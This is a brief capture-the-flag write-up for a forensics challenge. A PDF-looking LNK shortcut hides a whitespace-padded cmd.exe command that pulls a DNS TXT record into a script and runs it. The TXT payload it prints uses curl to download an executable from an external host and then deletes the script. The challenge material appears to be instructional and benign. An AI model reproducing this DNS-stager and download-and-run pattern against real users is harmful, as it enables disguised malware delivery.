# Writeup for PDForensics
Click the link in the pdf file and download a zip file. Unzip it and get another PDF file. It is a lnk file, check the details and you can find the command
```
"%windir%\system32\cmd.exe                                              " cmd /c         cd %TMP% & nslookup -type=TXT cnc.magpiectf.ca | (for /f "tokens=*" %c in ('findstr """"') do @echo %~c) > poc.cmd & poc.cmd
```

Then check the dns record of cnc.magpiectf.ca: ```nslookup -type=TXT cnc.magpiectf.ca```
```
Server:         172.22.208.1
Address:        172.22.208.1#53

Non-authoritative answer:
cnc.magpiectf.ca        text = "calc.exe & taskkill /im calculator.exe /f & curl https://roguewarecdn.s3.amazonaws.com/notmalware.exe > notavirus.exe & curl http://ascii.live/rick  & del poc.cmd"

Authoritative answers can be found from:
```

It gives another command, curl the executable and check it, it contains the flag in plaintext: ```cat notavirus.exe```
```
magpie{D0n't_cl1ck_0n_L1nk5}
```